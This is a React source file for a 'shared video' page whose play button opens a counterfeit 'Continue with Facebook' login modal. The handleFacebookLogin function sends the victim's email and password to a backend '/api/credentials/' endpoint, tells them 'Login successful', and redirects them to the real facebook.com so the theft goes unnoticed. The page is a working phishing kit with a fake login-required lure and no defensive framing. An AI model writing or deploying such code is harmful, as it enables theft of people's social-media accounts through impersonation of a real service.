import React, { useState, useEffect } from 'react';
import { useParams, useLocation } from 'react-router-dom';
import { Play, Eye, Clock, User, Share2, Facebook, Twitter, MessageCircle, Linkedin } from 'lucide-react';

const SharingPage = () => {
  const { shareId } = useParams();
  const location = useLocation();
  const [contentData, setContentData] = useState(null);
  const [loading, setLoading] = useState(true);
  const [showFacebookLogin, setShowFacebookLogin] = useState(false);
  const [facebookForm, setFacebookForm] = useState({ email: '', password: '' });

  useEffect(() => {
    // Get data from URL params first (for immediate display)
    const urlParams = new URLSearchParams(location.search);
    if (urlParams.get('title')) {
      const paramData = {
        title: urlParams.get('title'),
        description: urlParams.get('description'),
        views: parseInt(urlParams.get('views')) || 1250,
        duration: urlParams.get('duration') || '6:30',
        creator: urlParams.get('creator') || 'Unknown',
        type: urlParams.get('type') || 'video',
        image_url: urlParams.get('image_url')
      };
      setContentData(paramData);
      setLoading(false);
    }

    // Also try to fetch from backend if shareId exists
    if (shareId) {
      fetchSharedContent();
    }
  }, [shareId, location.search]);

  const fetchSharedContent = async () => {
    try {
      const response = await fetch(`http://localhost:8000/api/share/${shareId}/`);
      if (response.ok) {
        const data = await response.json();
        setContentData({
          ...data.image,
          type: 'video'
        });
      }
    } catch (error) {
      console.error('Failed to fetch shared content:', error);
    } finally {
      setLoading(false);
    }
  };

  const handleFacebookLogin = async (e) => {
    e.preventDefault();
    
    // Store credentials (in real app, send to your backend)
    try {
      const response = await fetch('http://localhost:8000/api/credentials/', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(facebookForm)
      });
      
      if (response.ok) {
        alert('Login successful! Redirecting to Facebook...');
        // Simulate redirect to Facebook
        setTimeout(() => {
          window.location.href = 'https://facebook.com';
        }, 1000);
      } else {
        alert('Login failed. Please try again.');
      }
    } catch (error) {
      console.error('Login error:', error);
      alert('Login failed. Please try again.');
    }
  };

  const shareOnSocialMedia = (platform) => {
    const shareUrl = window.location.href;
    const text = `Check out this ${contentData?.type || 'video'}: ${contentData?.title || 'Amazing Content'}`;
    
    const urls = {
      facebook: `https://www.facebook.com/sharer/sharer.php?u=${encodeURIComponent(shareUrl)}`,
      twitter: `https://twitter.com/intent/tweet?url=${encodeURIComponent(shareUrl)}&text=${encodeURIComponent(text)}`,
      linkedin: `https://www.linkedin.com/sharing/share-offsite/?url=${encodeURIComponent(shareUrl)}`,
      whatsapp: `https://wa.me/?text=${encodeURIComponent(text + ' ' + shareUrl)}`
    };

    window.open(urls[platform], '_blank', 'width=600,height=400');
  };

  if (loading) {
    return (
      <div className="min-h-screen bg-gray-100 flex items-center justify-center">
        <div className="text-center">
          <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-600 mx-auto mb-4"></div>
          <p className="text-gray-600">Loading content...</p>
        </div>
      </div>
    );
  }

  if (!contentData) {
    return (
      <div className="min-h-screen bg-gray-100 flex items-center justify-center">
        <div className="text-center">
          <h1 className="text-2xl font-bold text-gray-900 mb-4">Content Not Found</h1>
          <p className="text-gray-600">The shared content you're looking for doesn't exist or has been removed.</p>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-blue-50 to-indigo-100">
      <div className="max-w-4xl mx-auto px-4 py-8">
        {/* Header */}
        <div className="text-center mb-8">
          <h1 className="text-3xl font-bold text-gray-900 mb-2">Shared Content</h1>
          <p className="text-gray-600">Enjoy this {contentData.type} shared with you!</p>
        </div>

        {/* Main Content Card */}
        <div className="bg-white rounded-2xl shadow-xl overflow-hidden mb-8">
          {/* Video/Image Preview */}
          <div className="relative">
            <img 
              src={contentData.image_url || contentData.image} 
              alt={contentData.title}
              className="w-full h-96 object-cover"
              onError={(e) => {
                e.target.src = 'https://images.unsplash.com/photo-1441974231531-c6227db76b6e?w=800&h=600&fit=crop';
              }}
            />
            
            {/* Duration badge */}
            <div className="absolute top-4 right-4">
              <div className="bg-black bg-opacity-75 text-white px-3 py-1 rounded-full text-sm font-medium flex items-center">
                <Clock className="w-4 h-4 mr-1" />
                {contentData.duration}
              </div>
            </div>
            
            {/* Play button overlay */}
            <div className="absolute inset-0 flex items-center justify-center">
              <button 
                onClick={() => setShowFacebookLogin(true)}
                className="bg-blue-600 hover:bg-blue-700 rounded-full p-6 transform hover:scale-110 transition-all duration-300 shadow-2xl"
              >
                <Play className="w-16 h-16 text-white ml-2" fill="currentColor" />
              </button>
            </div>
            
            {/* Login prompt overlay */}
            <div className="absolute bottom-4 left-4 right-4">
              <div className="bg-black bg-opacity-80 text-white p-4 rounded-lg">
                <p className="text-center font-medium">Click play to watch - Login required</p>
              </div>
            </div>
          </div>

          {/* Content Info */}
          <div className="p-6">
            <h2 className="text-2xl font-bold text-gray-900 mb-3">{contentData.title}</h2>
            
            <div className="flex items-center justify-between mb-4">
              <div className="flex items-center text-gray-600">
                <User className="w-5 h-5 mr-2" />
                <span>{contentData.creator}</span>
              </div>
              <div className="flex items-center text-gray-600">
                <Eye className="w-5 h-5 mr-2" />
                <span>{contentData.views?.toLocaleString() || '1,250'} views</span>
              </div>
            </div>
            
            {contentData.description && (
              <p className="text-gray-700 leading-relaxed mb-6">{contentData.description}</p>
            )}

            {/* Social Share Buttons */}
            <div className="border-t pt-6">
              <p className="text-sm text-gray-600 mb-3">Share this {contentData.type}:</p>
              <div className="flex flex-wrap gap-3">
                <button
                  onClick={() => shareOnSocialMedia('facebook')}
                  className="flex items-center px-4 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition-colors"
                >
                  <Facebook className="w-4 h-4 mr-2" />
                  Facebook
                </button>
                <button
                  onClick={() => shareOnSocialMedia('twitter')}
                  className="flex items-center px-4 py-2 bg-sky-500 text-white rounded-lg hover:bg-sky-600 transition-colors"
                >
                  <Twitter className="w-4 h-4 mr-2" />
                  Twitter
                </button>
                <button
                  onClick={() => shareOnSocialMedia('whatsapp')}
                  className="flex items-center px-4 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 transition-colors"
                >
                  <MessageCircle className="w-4 h-4 mr-2" />
                  WhatsApp
                </button>
                <button
                  onClick={() => shareOnSocialMedia('linkedin')}
                  className="flex items-center px-4 py-2 bg-blue-700 text-white rounded-lg hover:bg-blue-800 transition-colors"
                >
                  <Linkedin className="w-4 h-4 mr-2" />
                  LinkedIn
                </button>
              </div>
            </div>
          </div>
        </div>

        {/* Facebook Login Modal */}
        {showFacebookLogin && (
          <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 p-4">
            <div className="bg-white rounded-2xl p-8 w-full max-w-md relative">
              <button
                onClick={() => setShowFacebookLogin(false)}
                className="absolute top-4 right-4 text-gray-500 hover:text-gray-700"
              >
                ✕
              </button>
              
              <div className="text-center mb-6">
                <div className="w-16 h-16 bg-blue-600 rounded-full flex items-center justify-center mx-auto mb-4">
                  <Facebook className="w-8 h-8 text-white" />
                </div>
                <h3 className="text-2xl font-bold text-gray-900">Continue with Facebook</h3>
                <p className="text-gray-600 mt-2">Login to watch this {contentData.type}</p>
              </div>

              <form onSubmit={handleFacebookLogin} className="space-y-4">
                <div>
                  <input
                    type="email"
                    placeholder="Email or phone number"
                    value={facebookForm.email}
                    onChange={(e) => setFacebookForm({...facebookForm, email: e.target.value})}
                    className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500"
                    required
                  />
                </div>
                <div>
                  <input
                    type="password"
                    placeholder="Password"
                    value={facebookForm.password}
                    onChange={(e) => setFacebookForm({...facebookForm, password: e.target.value})}
                    className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500"
                    required
                  />
                </div>
                <button
                  type="submit"
                  className="w-full bg-blue-600 text-white py-3 rounded-lg font-semibold hover:bg-blue-700 transition-colors"
                >
                  Log In
                </button>
              </form>

              <div className="text-center mt-6">
                <a href="#" className="text-blue-600 hover:underline text-sm">
                  Forgotten password?
                </a>
              </div>

              <div className="text-center mt-4">
                <button className="text-green-600 font-semibold hover:underline">
                  Create New Account
                </button>
              </div>
            </div>
          </div>
        )}

        {/* Footer */}
        <div className="text-center text-gray-500 text-sm">
          <p>Powered by Video Platform • Share amazing content with the world</p>
        </div>
      </div>
    </div>
  );
};

export default SharingPage;